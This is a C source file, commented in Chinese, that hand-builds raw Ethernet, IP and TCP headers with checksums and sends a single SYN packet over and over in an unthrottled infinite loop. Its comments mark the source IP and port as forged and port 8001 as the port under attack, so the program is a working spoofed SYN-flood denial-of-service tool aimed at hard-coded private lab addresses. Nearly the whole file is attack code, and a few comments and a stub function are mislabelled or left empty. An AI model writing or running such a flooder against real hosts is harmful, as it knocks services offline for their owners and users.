#include <stdio.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/ip.h> //ip
#include <netinet/tcp.h> //tcp
#include <stdlib.h>
#include <netinet/in.h>
#include <pthread.h>
#include <string.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <arpa/inet.h>

#define DEFAULT_DEVICE "eno16777736"

//#include <syswait.h>
//usleep(n) //n微秒
//Sleep（n）//n毫秒
//sleep（n）//n秒

typedef struct pseudohdr {
    uint32_t src;
    uint32_t dst;
    uint8_t zero;
    uint8_t protocol;
    uint16_t len;
} pseudohdr_t;

/**
    1. ip包头(共20个字节)按照每16个bit作为一个值依次进行相加
    2. 将计算结果的进位加到低16位上
    3. 将结果取反
 * @param addr
 * @param length
 * @return
 */
uint16_t get_check_sum(uint8_t *addr, size_t length) {
    uint32_t checksum = 0;
    uint16_t *buffer = (uint16_t *) addr;
    size_t size = length;
    while (size > 1) {
        checksum += *buffer++;
        size -= sizeof(uint16_t);
    }
    if (size) {
        checksum += *(uint8_t *) buffer;
    }
    checksum = (checksum >> 16) + (checksum & 0xffff);
    checksum += (checksum >> 16);
    return (uint16_t) (~checksum);
}

//校验和涵数 tcp头
unsigned short tcpheadsum(struct iphdr *ipheader, uint8_t *addr, size_t length) {
    uint16_t *buffer;
    buffer = (uint16_t *) addr;

    //伪首部
    pseudohdr_t pseudoheader;
    /* 填充tcpheader... */
    /* 填充pseudoheader */
    pseudoheader.src = ipheader->saddr;
    pseudoheader.dst = ipheader->daddr;
    pseudoheader.zero = 0;
    pseudoheader.protocol = ipheader->protocol;
    pseudoheader.len = htons(length);

    /* 填充tcpsumblock */
    /* 伪首部 + TCP 头 + 数据 */
    uint8_t *tcpsumblock = (uint8_t *) malloc(sizeof(pseudohdr_t) + length);
    memcpy(tcpsumblock, &pseudoheader, sizeof(pseudohdr_t));
    memcpy(tcpsumblock + sizeof(pseudohdr_t), buffer, length);
    /* 计算TCP 包校验和 */
    uint16_t checksum = get_check_sum(tcpsumblock, sizeof(pseudohdr_t) + length);
    free(tcpsumblock);
    tcpsumblock = NULL;
    return checksum;
}

void *sendArpPacket(void *);

int main(int argc, char *argv[]) {
    int sock, size, bytes_send;
    struct sockaddr_ll sin;
    memset(&sin, 0, sizeof(sin));
    sin.sll_family = AF_PACKET;
    sin.sll_halen = htons(6);
    uint8_t src_mac[] = {0x00, 0x0c, 0x29, 0xc1, 0x09, 0x28};//
    memcpy(sin.sll_addr, src_mac, 6);
    char *interface = DEFAULT_DEVICE;
    if ((sin.sll_ifindex = if_nametoindex(interface)) == 0) {
        perror("if_nametoindex() failed to obtain interface index ");
        exit(EXIT_FAILURE);
    }

    size = 54;
    uint8_t data[size];
    memset(&data, 0, sizeof(data));

//    uint8_t bro_hw[] = {0xb4, 0x2e, 0x99, 0x89, 0xdf, 0xe2};//shijie
//    uint8_t bro_hw[] = {0xb4, 0x2e, 0x99, 0x89, 0xe3, 0xbd};//test
    uint8_t bro_hw[] = {0x00, 0x0c, 0x29, 0xc1, 0x09, 0x28};//vm
    uint8_t src_hw[] = {0xb4, 0x2e, 0x99, 0x89, 0xe3, 0x11};

//    uint8_t src_ip[] = {0x0a, 0x01, 0x66, 0x01}; //假冒的ip 源地址 目标地址
//    uint8_t dec_ip[] = {0x0a, 0x01, 0x66, 0x61}; //test
//    uint8_t dec_ip[] = {0x0a, 0x01, 0x66, 0x55}; //shijie

    //以太网首部
    printf("create ethhead, ethhdr size=%d字节\r\n", sizeof(struct ethhdr));
    struct ethhdr *ethhead = (struct ethhdr *) data;
    printf("1.广播mac地址\r\n");
    memcpy(ethhead->h_dest, bro_hw, 6);
    printf("2.源mac地址\r\n");
    memcpy(ethhead->h_source, src_hw, 6);
    printf("3.帧类型 ARP_FRAME_TYPE\r\n");
    //ip:0800,arp:0x0806,rarp:0x0835
    ethhead->h_proto = htons(0x0800);
    //----------------------------------------------------
    printf("create iphead, iphdr size=%d字节\r\n", sizeof(struct iphdr));
    struct iphdr *iphead = (struct iphdr *) (data + sizeof(struct ethhdr));
    iphead->version = 4;//版本号4 IP4用4
    iphead->ihl = 5;//little-endian IP头长度(单位为40位)5位
    iphead->tos = 0;//服务类型 一般为0
    iphead->tot_len = htons(size - sizeof(struct ethhdr));
    iphead->id = htons(1024);//标识16
    iphead->frag_off = htons(0);//分段偏移
    iphead->ttl = 201; //生存时间
    iphead->protocol = IPPROTO_TCP;//传输协议 tcp是6
    printf("发送端源ip地址\r\n");
    iphead->saddr = inet_addr("10.1.102.2");
//    iphead->daddr = inet_addr("10.1.102.85");//shijie
//    iphead->daddr = inet_addr("10.1.102.90");//test
    iphead->daddr = inet_addr("10.1.102.97");//vm
    iphead->check = 0;//头校验和
    iphead->check = get_check_sum(data + sizeof(struct ethhdr), size - sizeof(struct ethhdr));
    printf("iphead check=%d\r\n", iphead->check);

    printf("create tcphead, tcphdr size=%d字节\r\n", sizeof(struct tcphdr));
    struct tcphdr *tcphead = (struct tcphdr *) (data + sizeof(struct ethhdr) + sizeof(struct iphdr));
    tcphead->source = htons(80);//假冒的端口      // 源端口
    tcphead->dest = htons(8001);//被攻击的端口    // 目的端口
    tcphead->seq = htonl(0);// 序号 3 + 64 << 8
    tcphead->ack_seq = htons(0);// 确认号 收到的TCP信息的序号+1
    tcphead->res1 = 0;//4bit not used
    tcphead->doff = 5;//4bit tcpheader length
    tcphead->fin = 0;//
    tcphead->syn = 1;//标志 同步
    tcphead->rst = 0;//rst flag
    tcphead->psh = 0;//psh flag
    tcphead->ack = 0;//ack flag
    tcphead->urg = 0;//标志 紧急
    tcphead->res2 = 0;//2bit
    tcphead->window = htons(0x0200);//窗口
    tcphead->urg_ptr = htons(0);//紧急指针0x20
    tcphead->check = 0; //校验和
    tcphead->check = tcpheadsum(iphead, tcphead, size - sizeof(struct ethhdr) - sizeof(struct iphdr));
    printf("tcphead check=%d\r\n", tcphead->check);

    sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        printf("create socket error!\r\n");
        exit(1);
    } else {
        printf("create socket!\r\n");
    }
    printf("[");
    for (int i = 0; i < size; i++) {
        printf("0x%x ", data[i]);
    }
    printf("] \r\n");

    int i = 0;
    printf("start send\r\n");
    for (;;) {
        bytes_send = sendto(sock, &data, sizeof(data), 0, (struct sockaddr *) &sin, sizeof(sin));
        if (bytes_send <= 0) {
            perror("sendto() failed");
            exit(EXIT_FAILURE);
        }
//        sleep(1);
        if (i < 5) {
            printf("send %d times! \r\n", i);
        }
        i++;
    }
    printf("end send\r\n");
}

void *sendArpPacket(void *vptr) {

}